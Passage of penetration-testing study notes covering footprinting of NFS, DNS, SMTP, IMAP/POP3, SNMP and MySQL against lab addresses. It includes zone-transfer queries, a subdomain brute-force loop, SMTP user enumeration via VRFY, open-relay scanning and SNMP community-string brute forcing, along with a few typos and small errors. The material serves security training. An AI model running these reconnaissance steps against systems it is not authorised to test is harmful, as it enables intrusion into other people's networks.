        sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
        cd target-NFS
        treee .

4.  List Contents with Usernames & Group Names

        ls -l mnt/nfs/

5.  List Contents with UIDs & GUIDs

        ls -n mnt/nfs/

6.  Unmounting

        cd ..
        sudo umount ./target-NFS


<a id="org4926d4b"></a>

## DNS\\53(UDP)

`DNS`, an integral part of the Internet, facilitates access to web servers via `domain names` like bard.google.com or www.google.com, mapping them to `specific IP` addresses provided by hosting providers. It operates as a `system converting computer names` into IP addresses without a central database, resembling a vast library housing various phone books. This information disperses across thousands of name servers globally. <span class="underline">These distributed DNS servers translate domain names to IP addresses</span>, directing users to specific servers associated with a domain. Various types of DNS servers are employed worldwide to manage this functionality.

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Server Type</th>
<th scope="col" class="org-left">Description</th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left">DNS Root Server</td>
<td class="org-left">Responsible for top-level domains (TLDs), queried if a name server fails to respond. They act as a central interface between users and internet content, linking domains and IP addresses. ICANN coordinates the 13 root servers globally.</td>
</tr>


<tr>
<td class="org-left">Authoritative Nameserver</td>
<td class="org-left">Holds authority for specific zones, responding only to queries within its responsibility. The information they provide is considered definitive. If such a server can't answer, the root name server steps in.</td>
</tr>


<tr>
<td class="org-left">Non-authoritative Nameserver</td>
<td class="org-left">Not accountable for a particular DNS zone but gathers information about specific zones through recursive or iterative DNS queries.</td>
</tr>


<tr>
<td class="org-left">Caching DNS Server</td>
<td class="org-left">Stores information from other name servers for a set duration, determined by the authoritative name server. These servers hold cached data.</td>
</tr>


<tr>
<td class="org-left">Forwarding Server</td>
<td class="org-left">Solely responsible for forwarding DNS queries to other DNS servers, handling only query redirection.</td>
</tr>


<tr>
<td class="org-left">Resolver</td>
<td class="org-left">Not authoritative but performs local name resolution on computers or routers. Resolvers aid in converting domain names to IP addresses without maintaining their own zone information.</td>
</tr>
</tbody>
</table>

DNS is mainly unencrypted. Devices on the local WLAN and Internet providers can therefore hack in and spy on DNS queries. Since this poses a privacy risk, there are now some solutions for DNS encryption. By default, IT security professionals apply `DNS over TLS` (`DoT`) or `DNS over HTTPS` (`DoH`) here. In addition, the network protocol `DNSCrypt` also encrypts the traffic between the computer and the name server.

Different `DNS records` are used for the DNS queries, which all have various tasks. Moreover, separate entries exist for different functions since we can set up mail servers and other servers for a domain.

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">DNS Record</th>
<th scope="col" class="org-left">Description</th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left">A</td>
<td class="org-left">Returns the IPv4 address of the requested domain.</td>
</tr>


<tr>
<td class="org-left">AAAA</td>
<td class="org-left">Returns the IPv6 address of the requested domain.</td>
</tr>


<tr>
<td class="org-left">MX</td>
<td class="org-left">Identifies responsible mail servers for the domain.</td>
</tr>


<tr>
<td class="org-left">NS</td>
<td class="org-left">Specifies the domain's DNS servers (nameservers).</td>
</tr>


<tr>
<td class="org-left">TXT</td>
<td class="org-left">Versatile record containing various information. It's used for purposes like Google Search Console validation, SSL certificate validation, SPF and DMARC entries for mail traffic validation, and protection from spam.</td>
</tr>


<tr>
<td class="org-left">CNAME</td>
<td class="org-left">Serves as an alias, pointing one domain to the same location as another. For instance, if www.hackthebox.eu should direct to the same IP as hackthebox.eu, an A record is set for one and a CNAME record is created for the other.</td>
</tr>


<tr>
<td class="org-left">PTR</td>
<td class="org-left">Performs reverse lookup, translating IP addresses into valid domain names.</td>
</tr>


<tr>
<td class="org-left">SOA</td>
<td class="org-left">Provides information about the corresponding DNS zone and the administrative contact's email address. It signifies the start of a zone of authority and contains essential information about the zone's management.</td>
</tr>
</tbody>
</table>


<a id="org7ec94a4"></a>

### Default Configuration

There are many different configuration types for DNS.
All DNS servers work with three different types of hierarchical configuration files:

1.  `local` DNS configuration files
2.  `zone` files
3.  `reverse` name resolution files

The DNS server [Bind9](https://www.isc.org/bind/) is very often used on Linux-based distributions. Its local configuration file (named.conf) is roughly divided into two sections, firstly the options section for general settings and secondly the zone entries for the individual domains. The local configuration files are usually:

-   named.conf.local
-   named.conf.options
-   named.conf.log

The configuration file `named.conf` is divided into several options that control the behavior of the name server. A distinction is made between `global options` and `zone options`.

1.  Local DNS Configuration

        cat /etc/bind/named.conf.local
        
        //
        // Do any local configuration here
        //
        
        // Consider adding the 1918 zones here, if they are not used in your
        // organization
        //include "/etc/bind/zones.rfc1918";
        zone "domain.com" {
            type master;
            file "/etc/bind/db.domain.com";
            allow-update { key rndc-key; };
        };

2.  Zone Files

    Zone files define individual DNS zones and are usually dedicated to one domain, except for ISP and public DNS servers. They utilize the BIND file format, a standard in DNS server software. These text files include essential records like `SOA` and `NS`, ensuring completeness and accuracy. Any syntax error renders the entire file unusable, causing DNS queries for that zone to receive a SERVFAIL error. Essentially, zone files function as a structured phone book for DNS servers, detailing domain-to-IP address mappings following BIND format rules.
    
        cat /etc/bind/db.domain.com
        
        ;
        ; BIND reverse data file for local loopback interface
        ;
        $ORIGIN domain.com
        $TTL 86400
        @     IN     SOA    dns1.domain.com.     hostmaster.domain.com. (
                            2001062501 ; serial
                            21600      ; refresh after 6 hours
                            3600       ; retry after 1 hour
                            604800     ; expire after 1 week
                            86400 )    ; minimum TTL of 1 day
        
              IN     NS     ns1.domain.com.
              IN     NS     ns2.domain.com.
        
              IN     MX     10     mx.domain.com.
              IN     MX     20     mx2.domain.com.
        
                     IN     A       10.129.14.5
        
        server1      IN     A       10.129.14.5
        server2      IN     A       10.129.14.7
        ns1          IN     A       10.129.14.2
        ns2          IN     A       10.129.14.3
        
        ftp          IN     CNAME   server1
        mx           IN     CNAME   server1
        mx2          IN     CNAME   server2
        www          IN     CNAME   server2

3.  Reverse Name Resolution Zone Files

    Indeed, for a `Fully Qualified Domain Name` (`FQDN`) to resolve to an IP address, the DNS server requires a reverse lookup file. This file utilizes `PTR` (Pointer) records to map the computer name (FQDN) to the last octet of an IP address, correlating it with the respective host. PTR records play a crucial role in the reverse translation of IP addresses into corresponding names, as highlighted in the table previously mentioned.
    
        cat /etc/bind/db.10.129.14
        
        ;
        ; BIND reverse data file for local loopback interface
        ;
        $ORIGIN 14.129.10.in-addr.arpa
        $TTL 86400
        @     IN     SOA    dns1.domain.com.     hostmaster.domain.com. (
                            2001062501 ; serial
                            21600      ; refresh after 6 hours
                            3600       ; retry after 1 hour
                            604800     ; expire after 1 week
                            86400 )    ; minimum TTL of 1 day
        
              IN     NS     ns1.domain.com.
              IN     NS     ns2.domain.com.
        
        5    IN     PTR    server1.domain.com.
        7    IN     MX     mx.domain.com.
        ...SNIP...


<a id="org2cbc509"></a>

### Dangerous Settings

DNS servers face various `vulnerabilities` that attackers exploit. Vulnerabilities targeting BIND9, for instance, are documented on `CVEdetails`. SecurityTrails also outlines popular attacks on DNS servers.

`Certain configurations` contribute to these vulnerabilities. DNS, being complex, is prone to errors, compelling administrators to implement temporary workarounds until an exact solution is found. Often, functionality takes precedence over security, prompting the release of elements to ensure parts of the infrastructure function as intended. This prioritization sometimes leads to misconfigurations and vulnerabilities within the system.

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Option</th>
<th scope="col" class="org-left">Description</th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left">allow-query</td>
<td class="org-left">Specifies hosts permitted to send requests to the DNS server.</td>
</tr>


<tr>
<td class="org-left">allow-recursion</td>
<td class="org-left">Specifies hosts permitted to send recursive requests to the DNS server.</td>
</tr>


<tr>
<td class="org-left">allow-transfer</td>
<td class="org-left">Specifies hosts permitted to receive zone transfers from the DNS server.</td>
</tr>


<tr>
<td class="org-left">zone-statistics</td>
<td class="org-left">Gathers statistical data related to zones managed by the DNS server.</td>
</tr>
</tbody>
</table>


<a id="orgf0e5676"></a>

### Footprinting the Service

Footprinting DNS servers involves querying them to gather information about other name servers known to them. This is typically done using the `NS` (Name Server) record and specifying the DNS server to be queried using the "`@`" character. By doing so, one can identify additional DNS servers and query their records. However, these other servers might have distinct configurations and can be permanent for different zones.

1.  Querying Name Servers (NS Records)

    Retrieves the `NS` records for the domain "example.com", showcasing the authoritative name servers responsible for the domain.
    
        nslookup -type=NS example.com
    
        dig ns example.com @10.129.14.128

2.  DIG - Version Query

        dig CH TXT version.bind 10.129.120.85

3.  Querying ANY

    We can use the option `ANY` to view all available records. 
    
        dig any example.com @10.129.14.128

4.  Querying A Records

    Fetches the IPv4 address (`A record`) associated with the domain "example.com".
    
        nslookup example.com

5.  Querying MX Records

    Retrieves the Mail Exchange (`MX`) records for the domain "example.com", specifying mail servers responsible for email delivery.
    
        nslookup -type=MX example.com

6.  Querying TXT Records

    Fetches the text records associated with the domain "example.com", commonly used for various purposes like `SPF`, `DMARC`, and `verification purposes`
    
        nslookup -type=TXT example.com

7.  Reverse DNS Lookup (PTR Records)

    Performs a reverse `DNS lookup` to find the domain associated with the given IP address.
    
        nslookup <IP address>

8.  Querying AXFR Zone Transfer

    `Zone transfer` in DNS involves transferring zones from one server to another, commonly occurring over `TCP` port `53` through `Asynchronous Full Transfer Zone` (`AXFR`). Given the criticality of DNS for businesses, maintaining identical zone files across multiple name servers is crucial. Changes made in one server's zone must be synchronized across all servers to ensure data consistency, achieved through zone transfer.
    
    The primary name server holds the `original zone data`, while secondary servers are installed for `increased reliability`, `load distribution`, or `primary server protection`. Top-Level Domains (TLDs) often mandate multiple servers for Second Level Domains' zone files.
    
    Entries in DNS are typically managed on the primary server, either through manual edits or automated dynamic updates from a database. Servers directly providing zone file synchronization are termed masters, while those obtaining data from masters are termed slaves. A primary server functions solely as a master, while a secondary server can serve as both a slave and a master.
    
    Slaves periodically fetch the `SOA` (`Start of Authority`) record from the master, comparing serial numbers at refresh intervals (**typically one hour**). A higher serial number on the master's SOA indicates mismatched data sets between servers.
    
        dig axfr example.com @10.129.14.128
    
    1.  AXFR Zone Transfer - Internal
    
        If the administrator used a subnet for the `allow-transfer` option for testing purposes or as a workaround solution or set it to any, everyone would query the entire zone file at the DNS server. In addition, other zones can be queried, which may even show internal IP addresses and hostnames.
        
            dig axfr internal.example.com @10.129.14.128

9.  Subdomain Brute Forcing

    The individual A records with the hostnames can also be found out with the help of a brute-force attack.
    
        for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.example.com @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
    
    Many different tools can be used for this, and most of them work in the same way. One of these tools is, for example [DNSenum](https://github.com/fwaeytens/dnsenum).
    
        dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt example.com


<a id="org9e6702c"></a>

## SMTP\\25,587

`SMTP`, the `Simple Mail Transfer Protocol`, is pivotal for email transmission in IP networks. It operates between email clients and outgoing mail servers or between SMTP servers themselves. Often used alongside `IMAP` or `POP3` for managing emails, SMTP follows a client-server structure, allowing server-to-server communication where servers act as clients.

Typically, SMTP servers accept connections on `port 25`, but newer iterations also utilize TCP `port 587` for secure mail receipt. Port 587 ensures **secure communication by encrypting connections** with the `STARTTLS` command, safeguarding authentication data from being transmitted in plaintext. Authentication happens during connection initiation when clients confirm identity via a `username` and `password`, enabling email transmission by sharing sender and recipient addresses, content, and parameters. Following transmission, the server forwards the email to another SMTP server.

While SMTP primarily operates unencrypted, SSL/TLS encryption secures data from unauthorized access. Some servers opt for alternative ports like TCP 465 for encrypted SMTP connections.

An integral function of SMTP servers is `spam prevention`, often achieved through authentication mechanisms like ESMTP with SMTP-Auth, allowing only authorized users to send emails. The SMTP client (`Mail User Agent` - `MUA`) submits emails to the SMTP server (`Mail Transfer Agent` - `MTA`), scrutinized for size and spam before storage. Occasionally, a Mail Submission Agent (`MSA`) or Relay server precedes the `MTA`, checking email validity.

Upon reaching the destination SMTP server, data packets assemble into complete emails, forwarded to the Mail Delivery Agent (MDA), and delivered to the recipient's mailbox, accessed through POP3 or IMAP protocols. The journey typically involves.
Client (`MUA`) ➞ Submission Agent (`MSA`) ➞ Open Relay (`MTA`) ➞ Mail Delivery Agent (`MDA`) ➞ Mailbox (`POP3/IMAP`).

SMTP, while vital for email transmission, presents inherent drawbacks in its network protocol.

-   One primary limitation is the absence of a reliable delivery confirmation when sending emails through SMTP. Though the protocol allows for such notifications, it lacks standardized formatting. Typically, only an English-language error message, accompanied by the undelivered message's header, is returned, making confirmation unusable.
-   Moreover, SMTP `doesn't authenticate` users during connection establishment, leading to sender unreliability. This loophole is exploited through open `SMTP relays`, commonly abused for mass spam distribution. Perpetrators utilize arbitrary fake sender addresses to avoid tracing (`mail spoofing`). To counter such misuse, various security techniques have been adopted. Suspicious emails are either rejected or directed to quarantine (`spam folder`). Security protocols like `DomainKeys` (`DKIM`) and `Sender Policy Framework` (`SPF`) play key roles in addressing these issues. `DKIM` verifies email authenticity **by adding digital signatures**, while `SPF` defines email sender legitimacy **by validating sender IP addresses** against domain records.

These security measures aim to mitigate email abuse and improve SMTP's reliability and authenticity, enhancing the overall integrity and trustworthiness of email communication.


<a id="orgeb77455"></a>

### Default Configuration

Each SMTP server can be configured in many ways, as can all other services. However, there are differences because the SMTP server is only responsible for sending and forwarding emails.

    cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"
    
    smtpd_banner = ESMTP Server 
    biff = no
    append_dot_mydomain = no
    readme_directory = no
    compatibility_level = 2
    smtp_tls_session_cache_database = btree:${data_directory}/smtp_scache
    myhostname = mail1.example.com
    alias_maps = hash:/etc/aliases
    alias_database = hash:/etc/aliases
    smtp_generic_maps = hash:/etc/postfix/generic
    mydestination = $myhostname, localhost 
    masquerade_domains = $myhostname
    mynetworks = 127.0.0.0/8 10.129.0.0/16
    mailbox_size_limit = 0
    recipient_delimiter = +
    smtp_bind_address = 0.0.0.0
    inet_protocols = ipv4
    smtpd_helo_restrictions = reject_invalid_hostname
    home_mailbox = /home/postfix

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Command</th>
<th scope="col" class="org-left">Description</th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left">AUTH PLAIN</td>
<td class="org-left">Service extension for client authentication.</td>
</tr>


<tr>
<td class="org-left">HELO</td>
<td class="org-left">Client initiates session by logging in with its computer name.</td>
</tr>


<tr>
<td class="org-left">MAIL FROM</td>
<td class="org-left">Client specifies the email sender.</td>
</tr>


<tr>
<td class="org-left">RCPT TO</td>
<td class="org-left">Client specifies the email recipient.</td>
</tr>


<tr>
<td class="org-left">DATA</td>
<td class="org-left">Client initiates email transmission.</td>
</tr>


<tr>
<td class="org-left">RSET</td>
<td class="org-left">Client aborts initiated transmission while maintaining the connection.</td>
</tr>


<tr>
<td class="org-left">VRFY</td>
<td class="org-left">Client checks for mailbox availability for message transfer.</td>
</tr>


<tr>
<td class="org-left">EXPN</td>
<td class="org-left">Client checks for mailbox availability for messaging using this command.</td>
</tr>


<tr>
<td class="org-left">NOOP</td>
<td class="org-left">Client requests a server response to prevent disconnection due to timeout.</td>
</tr>


<tr>
<td class="org-left">QUIT</td>
<td class="org-left">Client terminates the session.</td>
</tr>
</tbody>
</table>


<a id="org018a0c3"></a>

### Telnet - HELO/EHLO

To interact with the SMTP server, we can use the `telnet` tool to initialize a TCP connection with the SMTP server. The actual initialization of the session is done with the command mentioned above, `HELO` or `EHLO`.

    telnet 10.129.14.128 25
    
    Trying 10.129.14.128...
    Connected to 10.129.14.128.
    Escape character is '^]'.
    220 ESMTP Server 
    
    
    HELO mail1.example.com
    
    250 mail1.example.com
    
    
    EHLO mail1
    
    250-mail1.inlanefreight.htb
    250-PIPELINING
    250-SIZE 10240000
    250-ETRN
    250-ENHANCEDSTATUSCODES
    250-8BITMIME
    250-DSN
    250-SMTPUTF8
    250 CHUNKING


<a id="org831b7d5"></a>

### Telnet - VRFY

The command `VRFY` can be used to enumerate existing users on the system. However, this does not always work. Depending on how the SMTP server is configured, the SMTP server may issue `code 252` and confirm the existence of a user that does not exist on the system. A list of all SMTP response codes can be found here.

    telnet 10.129.14.128 25
    
    Trying 10.129.14.128...
    Connected to 10.129.14.128.
    Escape character is '^]'.
    220 ESMTP Server 
    
    VRFY root
    
    252 2.0.0 root
    
    
    VRFY cry0l1t3
    
    252 2.0.0 cry0l1t3
    
    
    VRFY testuser
    
    252 2.0.0 testuser
    
    
    VRFY aaaaaaaaaaaaaaaaaaaaaaaaaaaa
    
    252 2.0.0 aaaaaaaaaaaaaaaaaaaaaaaaaaaa


<a id="orgfd93266"></a>

### Send an Email

    telnet 10.129.14.128 25
    
    Trying 10.129.14.128...
    Connected to 10.129.14.128.
    Escape character is '^]'.
    220 ESMTP Server
    
    
    EHLO example.com
    
    250-mail1.example.com
    250-PIPELINING
    250-SIZE 10240000
    250-ETRN
    250-ENHANCEDSTATUSCODES
    250-8BITMIME
    250-DSN
    250-SMTPUTF8
    250 CHUNKING
    
    
    MAIL FROM: <cry0l1t3@exmple.com>
    
    250 2.1.0 Ok
    
    
    RCPT TO: <mrb3n@example.com> NOTIFY=success,failure
    
    250 2.1.5 Ok
    
    
    DATA
    
    354 End data with <CR><LF>.<CR><LF>
    
    From: <cry0l1t3@example.com>
    To: <mrb3n@inlanefreight.htb>
    Subject: DB
    Date: Tue, 28 Sept 2021 16:32:51 +0200
    Hey man, I am trying to access our XY-DB but the creds don't work. 
    Did you make any changes there?
    .
    
    250 2.0.0 Ok: queued as 6E1CF1681AB
    
    
    QUIT
    
    221 2.0.0 Bye
    Connection closed by foreign host.	


<a id="orgab4f65e"></a>

### Dangerous Settings

Using trusted relay servers prevents email filtering, but misconfigurations due to broad IP allowances pose security risks.

    mynetworks = 0.0.0.0/0


<a id="orgc9748c8"></a>

### Footprinting the Service

1.  Nmap

        sudo nmap 10.129.14.128 -sC -sV -p25

2.  Nmap - Open Relay

        sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v


<a id="org25631b4"></a>

## IMAP / POP3\\110,143,993,995

`Internet Message Access Protocol` (`MAP`) enables remote email management with folder structures, unlike `Post Office Protocol` (`POP3`), facilitating online access to emails directly on the server. It supports synchronization across multiple clients, offering advanced functionalities like hierarchical mailboxes and access to multiple mailboxes within a session. With IMAP, emails remain on the server until deletion, ensuring a uniform database across clients. POP3, on the other hand, does not have the same functionality as IMAP, and it only provides listing, retrieving, and deleting emails as functions at the email server. 

Clients access and create local copies of email structures, ensuring consistency across several devices. IMAP operates via port 143, using text-based ASCII commands for communication, and requires user authentication upon connection establishment. `SMTP` complements `IMAP` for email transmission and offers accessibility to sent emails across multiple devices by copying them into IMAP folders.

However, IMAP typically operates unencrypted, transmitting data in plaintext. To bolster security, email servers often require `encrypted` IMAP sessions `using SSL/TLS`, enhancing email traffic security and preventing unauthorized mailbox access. This encrypted connection usually utilizes standard port 143 or an alternative like `993`, depending on the implementation.


<a id="orgb1087c6"></a>

### Default Configuration

Exploring detailed configurations of `IMAP` and `POP3` protocols is intricate due to their numerous options.

    I recommend creating a VM locally and install the two packages dovecot-imapd, and dovecot-pop3d using apt and play around with the configurations and experiment.

In the documentation of Dovecot, we can find the individual [core](https://doc.dovecot.org/settings/core/) settings and [service](https://doc.dovecot.org/configuration_manual/service_configuration/) configuration options that can be utilized for our experiments.


<a id="org0e03d88"></a>

### IMAP Commands

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Command</th>
<th scope="col" class="org-left">Description</th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left">1 LOGIN username password</td>
<td class="org-left">User's login.</td>
</tr>


<tr>
<td class="org-left">1 LIST "" *</td>
<td class="org-left">Lists all directories.</td>
</tr>


<tr>
<td class="org-left">1 CREATE "INBOX"</td>
<td class="org-left">Creates a mailbox with a specified name.</td>
</tr>


<tr>
<td class="org-left">1 DELETE "INBOX"</td>
<td class="org-left">Deletes a mailbox.</td>
</tr>


<tr>
<td class="org-left">1 RENAME "ToRead" "Important"</td>
<td class="org-left">Renames a mailbox.</td>
</tr>


<tr>
<td class="org-left">1 LSUB "" *</td>
<td class="org-left">Returns a subset of active or subscribed names.</td>
</tr>


<tr>
<td class="org-left">1 SELECT INBOX</td>
<td class="org-left">Selects a mailbox for message access.</td>
</tr>


<tr>
<td class="org-left">1 UNSELECT INBOX</td>
<td class="org-left">Exits the selected mailbox.</td>
</tr>


<tr>
<td class="org-left">1 FETCH &lt;ID&gt; all</td>
<td class="org-left">Retrieves data associated with a message in the mailbox.</td>
</tr>


<tr>
<td class="org-left">1 CLOSE</td>
<td class="org-left">Removes all messages with the Deleted flag set.</td>
</tr>


<tr>
<td class="org-left">1 LOGOUT</td>
<td class="org-left">Closes the connection with the IMAP server.</td>
</tr>
</tbody>
</table>


<a id="org83f94f1"></a>

### POP3 Commands

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Command</th>
<th scope="col" class="org-left">Description</th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left">USER username</td>
<td class="org-left">Identifies the user.</td>
</tr>


<tr>
<td class="org-left">PASS password</td>
<td class="org-left">Authenticates the user using their password.</td>
</tr>


<tr>
<td class="org-left">STAT</td>
<td class="org-left">Requests the number of saved emails from the server.</td>
</tr>


<tr>
<td class="org-left">LIST</td>
<td class="org-left">Requests from the server the number and size of all emails.</td>
</tr>


<tr>
<td class="org-left">RETR id</td>
<td class="org-left">Requests the server to deliver the requested email by ID.</td>
</tr>


<tr>
<td class="org-left">DELE id</td>
<td class="org-left">Requests the server to delete the requested email by ID.</td>
</tr>


<tr>
<td class="org-left">CAPA</td>
<td class="org-left">Requests the server to display its capabilities.</td>
</tr>


<tr>
<td class="org-left">RSET</td>
<td class="org-left">Requests the server to reset the transmitted information.</td>
</tr>


<tr>
<td class="org-left">QUIT</td>
<td class="org-left">Closes the connection with the POP3 server.</td>
</tr>
</tbody>
</table>


<a id="orgd03ff72"></a>

### Dangerous Settings

Misconfigured settings within these email servers can expose critical information. Debugging executed commands or attempting to log in `anonymously`, akin to `FTP services`, might reveal vulnerabilities. While numerous companies opt for third-party email providers like Google or Microsoft, some manage their own mail servers for privacy and control reasons. However, this self-management presents risks. Administrators' configuration errors can inadvertently grant access to all sent and received emails, potentially containing sensitive or confidential information. Some of these critical configuration options include:

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Setting</th>
<th scope="col" class="org-left">Description</th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left">auth<sub>debug</sub></td>
<td class="org-left">Enables all authentication debug logging.</td>
</tr>


<tr>
<td class="org-left">auth<sub>debug</sub><sub>passwords</sub></td>
<td class="org-left">Adjusts log verbosity, logging the submitted passwords, and the authentication scheme.</td>
</tr>


<tr>
<td class="org-left">auth<sub>verbose</sub></td>
<td class="org-left">Logs unsuccessful authentication attempts along with their reasons.</td>
</tr>


<tr>
<td class="org-left">auth<sub>verbose</sub><sub>passwords</sub></td>
<td class="org-left">Logs passwords used for authentication, potentially truncating them for security purposes.</td>
</tr>


<tr>
<td class="org-left">auth<sub>anonymous</sub><sub>username</sub></td>
<td class="org-left">Specifies the username to be used when logging in with the ANONYMOUS SASL mechanism.</td>
</tr>
</tbody>
</table>


<a id="org176fbb1"></a>

### Footprinting the Service

1.  Nmap

        sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC

2.  cURL

        curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd

3.  OpenSSL - TLS Encrypted Interaction POP3

        openssl s_client -connect 10.129.14.128:pop3s

4.  OpenSSL - TLS Encrypted Interaction IMAP

        openssl s_client -connect 10.129.14.128:imaps


<a id="orgc95d151"></a>

## SNMP\\161(UDP)

`Simple Network Management Protocol` (`SNMP`) was created to monitor network devices.
In addition, this protocol can also be used to handle configuration tasks and change settings remotely.
In addition, configuration tasks can be handled, and settings can be made remotely using this standard.
In addition to the pure exchange of information, SNMP also transmits control commands using agents over `UDP` port `161`.
While in classical communication, it is always the client who actively requests information from the server, SNMP also enables the use of so-called `traps` over UDP port 162.
If a device is configured accordingly, an SNMP trap is sent to the client once a specific event occurs on the server-side.

1.  MIB

    The `Management Information Base` (`MIB`) is a standardized format to store device information in SNMP, ensuring interoperability across devices and systems. It's a textual file outlining all SNMP queryable objects, organized in a tree hierarchy via unique Object Identifiers (`OIDs`). These files `describe` where to find specific `information`, along with details like data types and access rights, but don't contain the actual data.

2.  OID

    `Object Identifiers` (`OIDs`) are numerical sequences representing nodes in a hierarchical structure. Each `OID` uniquely identifies a node in the tree, indicating its position and specificity. They're composed of integers concatenated with dot notation, enabling reference and lookup in the Object Identifier Registry.

3.  SNMPv1

    SNMP versions vary in their functionalities and security. `SNMPv1` is still prevalent in smaller networks, supporting information retrieval, device configuration, and event notifications. However, its lack of authentication or encryption makes it susceptible to unauthorized access and data interception.

4.  SNMPv2

    `SNMPv2`, specifically v2c, retains `SNMPv1's security issues`. While it introduces additional functionalities, it suffers from transmitting the community string in plain text, lacking inherent encryption.

5.  SNMPv3

    `SNMPv3` significantly improves security by implementing features like `username/password` authentication and data encryption using `pre-shared keys`. However, its complexity in configuration surpasses its predecessors.

6.  Community Strings

    Community strings function as passwords controlling access to requested information. Despite the advancements in SNMPv3, many organizations remain on SNMPv2 due to the complexity of transitioning. This ongoing use of SNMPv2 without encryption poses security risks, allowing interception of community strings during transmission, leading to potential unauthorized access. This scenario concerns administrators, as attackers could exploit these vulnerabilities without encryption, accessing sensitive information with intercepted community strings.


<a id="orgc076c55"></a>

### Default Configuration

The default configuration of the SNMP daemon defines the basic settings for the service, which include the IP addresses, ports, MIB, OIDs, authentication, and community strings.

1.  SNMP Daemon Config

        cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'
        
        sysLocation    Sitting on the Dock of the Bay
        sysContact     Me <me@example.org>
        sysServices    72
        master  agentx
        agentaddress  127.0.0.1,[::1]
        view   systemonly  included   .1.3.6.1.2.1.1
        view   systemonly  included   .1.3.6.1.2.1.25.1
        rocommunity  public default -V systemonly
        rocommunity6 public default -V systemonly
        rouser authPrivUser authpriv -V systemonly


<a id="org9f5c63b"></a>

### Dangerous Settings

Some dangerous settings that the administrator can make with SNMP are:

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Settings</th>
<th scope="col" class="org-left">Description</th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left">rwuser noauth</td>
<td class="org-left">Provides access to the full OID tree without authentication.</td>
</tr>


<tr>
<td class="org-left">rwcommunity &lt;community string&gt; &lt;IPv4&gt;</td>
<td class="org-left">Provides access to the full OID tree regardless of the request's origin (IPv4).</td>
</tr>


<tr>
<td class="org-left">rwcommunity6 &lt;community string&gt; &lt;IPv6&gt;</td>
<td class="org-left">Provides access to the full OID tree regardless of the request's origin (IPv6).</td>
</tr>
</tbody>
</table>


<a id="orgfb7e0a4"></a>

### Footprinting the Service

For footprinting SNMP, we can use tools like `snmpwalk`, `onesixtyone`, and `braa`.


<a id="orge9ea254"></a>

### SNMPwalk

    snmpwalk -v2c -c public 10.129.14.128


<a id="org7011b1e"></a>

### OneSixtyOne

    sudo apt install onesixtyone
    onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 10.129.14.128


<a id="org15eac1f"></a>

### Braa

Often, when certain community strings are bound to specific IP addresses, they are named with the hostname of the host, and sometimes even symbols are added to these names to make them more challenging to identify. 

    sudo apt install braa
    braa <community string>@<IP>:.1.3.6.*   # Syntax
    braa public@10.129.14.128:.1.3.6.*


<a id="org99e81b1"></a>

## MySQL\\3306

MySQL is an open-source relational database management system (`RDBMS`) that allows users to manage and store data.
MySQL uses `Structured Query Language` (`SQL`) for querying, managing, and manipulating data within databases.
MySQL works according to the `client-server` principle and consists of a MySQL server and one or more MySQL clients.

The client-server architecture in MySQL (and in many other database systems) separates the responsibilities of managing the database (<sub>server</sub>\_) from interacting with it (<sub>client</sub>\_).


<a id="org045de55"></a>

### core

1.  Mysql Server

    It's the software that actually `stores` and `manages` the databases. The server is responsible for **handling** **data storage**, **retrieval**, **access control**, and various other database-related tasks. 

2.  MySQL Clients

    The client is the interface that allows users or applications to interact with the MySQL server. It could be command-line tools like the `mysql command`, graphical user interfaces (GUIs) like `phpMyAdmin`, or various programming `language libraries` (like Python's mysql-connector, PHP's mysqli, etc.).

3.  MySQL Commands

    MySQL manages data using SQL commands; errors from SQL injections can expose unintended interactions. It manipulates data in tables, alters structures, and manages users.
    
    `MariaDB`, a MySQL derivative, emerged after the main developer left MySQL AB post-Oracle acquisition, continuing open-source database development.


<a id="org826edbf"></a>

### Default Configuration

It is so large that entire professions, such as `database administrator` (`DBA`), deal with almost nothing but databases.

    sudo apt install mysql-server -y
